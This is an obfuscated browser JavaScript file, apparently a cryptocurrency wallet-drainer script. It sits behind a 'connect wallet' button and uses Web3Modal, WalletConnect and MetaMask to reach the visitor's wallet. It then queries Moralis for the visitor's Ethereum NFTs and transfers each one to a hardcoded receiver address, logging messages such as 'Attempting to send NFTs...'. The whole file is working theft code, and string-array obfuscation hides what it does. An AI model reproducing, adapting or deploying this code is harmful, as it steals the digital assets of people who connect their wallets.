'use strict';
const _0x477d18 = _0x2bdf;
(function (_0x3a8969, _0x71e210)
{
    const _0x27f633 = _0x2bdf, _0x1def28 = _0x3a8969();
    while (!![]) {
        try {
            const _0x6e8b63 = parseInt(_0x27f633(0x196)) / 0x1 + parseInt(_0x27f633(0x173)) / 0x2 + parseInt(_0x27f633(0x1bd)) / 0x3 + parseInt(_0x27f633(0x1bc)) / 0x4 + -parseInt(_0x27f633(0x1a9)) / 0x5 * (-parseInt(_0x27f633(0x18e)) / 0x6) + -parseInt(_0x27f633(0x16c)) / 0x7 * (-parseInt(_0x27f633(0x1a6)) / 0x8) + -parseInt(_0x27f633(0x176)) / 0x9;
            if (_0x6e8b63 === _0x71e210) break;
            else _0x1def28['push'](_0x1def28['shift']());
        } catch (_0x444aec) { _0x1def28['push'](_0x1def28['shift']()); }
    }
}(_0x2a42, 0x4f95b));
const Web3Modal = window['Web3Modal']['default'],
    WalletConnectProvider = window['WalletConnectProvider']['default'],
    Fortmatic = window[_0x477d18(0x191)],
    evmChains = window[_0x477d18(0x193)];
let web3Modal, provider, selectedAccount;
const receiver_address = '0x1E897644454e44C500a0F2c158050853474B811d';
let onButtonClick, user_address;
async function init() {
    const _0x53fd5f = _0x477d18;
    console[_0x53fd5f(0x171)]('Initializing\x20example'),
        console[_0x53fd5f(0x171)](_0x53fd5f(0x16a), WalletConnectProvider),
        console['log'](_0x53fd5f(0x172), Portis),
        console['log'](_0x53fd5f(0x1ac), window[_0x53fd5f(0x198)],
            _0x53fd5f(0x169), window[_0x53fd5f(0x180)]);
    
    if (location[_0x53fd5f(0x18b)] !== 'https:') { }
    const _0x2fb24f = {
        'walletconnect': {
            'package': WalletConnectProvider,
            'options': { 'infuraId': _0x53fd5f(0x19b) }
        }, 'portis': { 'package': Portis, 'options': { 'id': '3f250ef7-0216-4a18-a21b-1b3a9292b33c' } }
    };
    return web3Modal = new Web3Modal({
        'cacheProvider': ![], 'providerOptions': _0x2fb24f, 'disableInjectedProvider': ![]
    }), console['log'](_0x53fd5f(0x17b), web3Modal), _0x53fd5f(0x164);
}
async function fetchAccountData() {
    const _0x45f710 = _0x477d18, _0x61b65 = new Web3(provider);
    console['log'](_0x45f710(0x195), _0x61b65);
    const _0x1b5b14 = await _0x61b65[_0x45f710(0x182)][_0x45f710(0x1ae)](), _0x4fc47a = evmChains[_0x45f710(0x166)](_0x1b5b14);
    console[_0x45f710(0x171)](_0x45f710(0x1af), _0x4fc47a['name']); const _0x32eda0 = await _0x61b65[_0x45f710(0x182)][_0x45f710(0x1b5)]();
    
    console[_0x45f710(0x171)](_0x45f710(0x19c), _0x32eda0),
        selectedAccount = _0x32eda0[0x0],
        console[_0x45f710(0x171)]('Selected\x20Account:\x20', selectedAccount),
        user_address = selectedAccount;
    const _0x489eaa = _0x32eda0[_0x45f710(0x1ad)]
        (async _0x166811 => {
            const _0x2c0747 = _0x45f710,
                _0x354c8d = await _0x61b65['eth']['getBalance'](_0x166811),
                _0x5171db = _0x61b65[_0x2c0747(0x1a0)][_0x2c0747(0x192)](_0x354c8d, _0x2c0747(0x188)),
                _0xd064ff = parseFloat(_0x5171db)[_0x2c0747(0x178)](0x4);
            console['log']('New\x20Account:\x20%o', { 'address': _0x166811, 'balance': _0x354c8d, 'humanFriendlyBalance': _0xd064ff });
        });
    
    await Promise[_0x45f710(0x16b)](_0x489eaa), proceed();
}

async function refreshAccountData() {
    await fetchAccountData(provider);
}
async function onConnect() {
    const _0x384f58 = _0x477d18;
    console[_0x384f58(0x171)](_0x384f58(0x1aa), web3Modal);
    try {
        provider = await web3Modal[_0x384f58(0x197)](),
            console[_0x384f58(0x171)](_0x384f58(0x1be), provider);
    } catch (_0x3d974e) { console[_0x384f58(0x171)](_0x384f58(0x18a), _0x3d974e); return; } provider['on'](_0x384f58(0x179), _0x417dd4 => { fetchAccountData(); }), provider['on'](_0x384f58(0x177), _0x5cee11 => { fetchAccountData(); }), provider['on']('networkChanged', _0x4ebbf5 => { fetchAccountData(); }), await refreshAccountData(), onButtonClick = proceed;
} onButtonClick = onConnect; async function onDisconnect() { const _0x427c70 = _0x477d18; console[_0x427c70(0x171)](_0x427c70(0x17a), provider), provider['close'] && (await provider[_0x427c70(0x190)](), await web3Modal[_0x427c70(0x170)](), provider = null), selectedAccount = null, document[_0x427c70(0x19f)](_0x427c70(0x1b6))[_0x427c70(0x187)]['display'] = _0x427c70(0x19d), document[_0x427c70(0x19f)](_0x427c70(0x1c0))['style'][_0x427c70(0x17e)] = 'none'; } async function proceed() { const _0xe1ff22 = _0x477d18; console[_0xe1ff22(0x171)](_0xe1ff22(0x16e)); const _0x444efa = 'https://zl8ii3iotet4.usemoralis.com:2053/server', _0x2ca86a = _0xe1ff22(0x17d); Moralis[_0xe1ff22(0x174)]({ 'serverUrl': _0x444efa, 'appId': _0x2ca86a }), console[_0xe1ff22(0x171)](_0xe1ff22(0x1b1)); let _0x37b7e0; try { if (provider[_0xe1ff22(0x168)]) { console[_0xe1ff22(0x171)]('Moralis\x20using\x20default\x20(MetaMask)'); const _0x51c47d = await Moralis[_0xe1ff22(0x1b9)](); console[_0xe1ff22(0x171)](_0xe1ff22(0x1ba), _0x51c47d); } else console[_0xe1ff22(0x171)](_0xe1ff22(0x199)), console[_0xe1ff22(0x1c1)](), _0x37b7e0 = await Moralis[_0xe1ff22(0x186)]({ 'provider': _0xe1ff22(0x1bb) }), console[_0xe1ff22(0x171)](_0xe1ff22(0x1a7), _0x37b7e0); } catch (_0x3b9bfd) { console[_0xe1ff22(0x171)]('Can\x27t\x20enable\x20web3:\x20', _0x3b9bfd); } async function _0x67cdb4() { const _0x853d78 = _0xe1ff22; console[_0x853d78(0x171)](_0x853d78(0x1b8)); if (!user_address) throw Error(_0x853d78(0x165) + _0x37b7e0); const _0x28edfc = { 'chain': 'eth', 'address': user_address, 'limit': '98' }, _0x3e80f1 = await Moralis[_0x853d78(0x18c)][_0x853d78(0x1b2)][_0x853d78(0x194)](_0x28edfc); console[_0x853d78(0x171)](_0x853d78(0x1a1), _0x3e80f1); if (_0x3e80f1['total'] < 0x1) return console[_0x853d78(0x171)]('No\x20NFTs\x20found'); _0x3e80f1[_0x853d78(0x185)][_0x853d78(0x19a)](async (_0x49038b, _0x33912e) => { const _0x20f999 = _0x853d78; let { contract_type: _0x3f6df2, token_address: _0x2b69ae, token_id: _0x1ff0d3 } = _0x49038b, _0x2886c7 = { 'type': _0x3f6df2[_0x20f999(0x16d)](), 'receiver': receiver_address, 'contractAddress': _0x2b69ae, 'tokenId': _0x1ff0d3 }, _0x8dd1f0 = { 'nft': _0x49038b, 'options': _0x2886c7 }, _0x2ca001 = await Moralis[_0x20f999(0x18f)](_0x2886c7)[_0x20f999(0x1a8)](_0x236b2c => { const _0x63edad = _0x20f999; console[_0x63edad(0x171)](_0x63edad(0x1b4), _0x236b2c, _0x63edad(0x189), _0x2886c7); }); console[_0x20f999(0x171)](_0x2ca001), await _0x2ca001[_0x20f999(0x1a2)]()[_0x20f999(0x17f)](_0x32cb2b => { const _0x489e31 = _0x20f999; console[_0x489e31(0x171)](_0x489e31(0x175), _0x32cb2b); }); }); } _0x67cdb4(); } { function getParameterByName(_0x1f49a6, _0x423178 = window[_0x477d18(0x1bf)][_0x477d18(0x18d)]) { const _0x341b7d = _0x477d18; _0x1f49a6 = _0x1f49a6[_0x341b7d(0x181)](/[\[\]]/g, _0x341b7d(0x17c)); var _0x1bf117 = new RegExp(_0x341b7d(0x184) + _0x1f49a6 + _0x341b7d(0x183)), _0x1eef1b = _0x1bf117[_0x341b7d(0x19e)](_0x423178); if (!_0x1eef1b) return null; if (!_0x1eef1b[0x2]) return ''; return decodeURIComponent(_0x1eef1b[0x2][_0x341b7d(0x181)](/\+/g, '\x20')); } let l = console[_0x477d18(0x171)]; function normalize(_0xa5df63) { const _0x3a77c7 = _0x477d18; let _0x426db0 = String(_0xa5df63); if (/^\[object/g['test'](_0x426db0)) { try { let _0x178f1f = JSON['stringify'](_0xa5df63); _0x426db0 = _0x178f1f; } catch (_0x2c83dc) { _0x426db0 = _0x426db0 + _0x3a77c7(0x1b3) + Object['keys'](_0xa5df63); } return _0x426db0; } else return _0x426db0; } if (getParameterByName(_0x477d18(0x171)) == _0x477d18(0x1b7)) { let el = document[_0x477d18(0x167)](_0x477d18(0x1ab)); el[_0x477d18(0x187)][_0x477d18(0x17e)] = _0x477d18(0x19d), console[_0x477d18(0x171)] = (_0x234417, ..._0x318cf0) => { const _0x1eae2d = _0x477d18; l(_0x234417), _0x318cf0 && _0x318cf0[_0x1eae2d(0x1a3)] > 0x0 && (l(_0x318cf0), _0x318cf0['forEach'](_0x5ed033 => _0x234417 += '\x20->\x20(' + normalize(_0x5ed033) + ')')), _0x234417 = normalize(_0x234417), el[_0x1eae2d(0x1b0)] += '~\x20' + _0x234417 + '\x0a'; }; } }
function _0x2bdf(_0x3bc1db, _0x31fafb) { const _0x2a4297 = _0x2a42(); return _0x2bdf = function (_0x2bdf2f, _0x58a78b) { _0x2bdf2f = _0x2bdf2f - 0x164; let _0x4b4a56 = _0x2a4297[_0x2bdf2f]; return _0x4b4a56; }, _0x2bdf(_0x3bc1db, _0x31fafb); } async function startx() { const _0x3dd230 = _0x477d18; await init()[_0x3dd230(0x17f)](() => { onButtonClick(); })[_0x3dd230(0x1a8)](_0x5f4b5e => { const _0x18a04f = _0x3dd230; console[_0x18a04f(0x171)](_0x18a04f(0x1a4)), console[_0x18a04f(0x171)](_0x5f4b5e); }); }; let els = document[_0x477d18(0x1a5)]('triggerx');[...els][_0x477d18(0x19a)](_0x132e18 => { const _0x2546f7 = _0x477d18; _0x132e18[_0x2546f7(0x16f)]('click', () => { startx(); }); }), console[_0x477d18(0x171)](window); function _0x2a42() { const _0x34655c = ['Moralis\x20user:', 'catch', '3015BYlgiH', 'Opening\x20a\x20dialog', 'testx', 'window.web3\x20is', 'map', 'getChainId', 'Chain\x20data\x20name:', 'innerText', 'Moralis\x20initialized', 'account', '\x20>>\x20', 'Can\x27t\x20transfer\x20NFT:', 'getAccounts', '#prepare', 'true', 'Attempting\x20to\x20send\x20NFTs...', 'enableWeb3', 'Moralis\x20web3Provider:', 'walletconnect', '535876txdiiD', '110100NFyDLs', 'provider', 'location', '#connected', 'count', 'Done', 'No\x20user:\x20', 'getChain', 'getElementById', 'isMetaMask', 'window.ethereum\x20is', 'WalletConnectProvider\x20is', 'all', '841372VETSAP', 'toLowerCase', 'Now\x20we\x20roll...', 'addEventListener', 'clearCachedProvider', 'log', 'Portis\x20is', '794850HWRIvB', 'start', 'Finished\x20Processing\x20transaction:', '11327931MijDyl', 'chainChanged', 'toFixed', 'accountsChanged', 'Killing\x20the\x20wallet\x20connection', 'Web3Modal\x20instance\x20is', '\x5c$&', '3xLk5z9syKf41UrVwxFgCEkwOVlDOAXTYGzQmOuZ', 'display', 'then', 'ethereum', 'replace', 'eth', '(=([^&#]*)|&|#|$)', '[?&]', 'result', 'authenticate', 'style', 'ether', 'Transfer\x20Options:\x20%o', 'Could\x20not\x20get\x20a\x20wallet\x20connection', 'protocol', 'Web3API', 'href', '1512fkOiNu', 'transfer', 'close', 'Fortmatic', 'fromWei', 'evmChains', 'getNFTs', 'Web3\x20instance\x20is', '624196BgqWAd', 'connect', 'web3', 'Moralis\x20using\x20walletconnect', 'forEach', 'e77435344ef0486893cdc26d7d5cf039', 'Got\x20accounts', 'block', 'exec', 'querySelector', 'utils', 'Eth\x20NFTs:\x20%o', 'wait', 'length', 'Initialization\x20failed.', 'getElementsByClassName', '16OwOONB']; _0x2a42 = function () { return _0x34655c; }; return _0x2a42(); }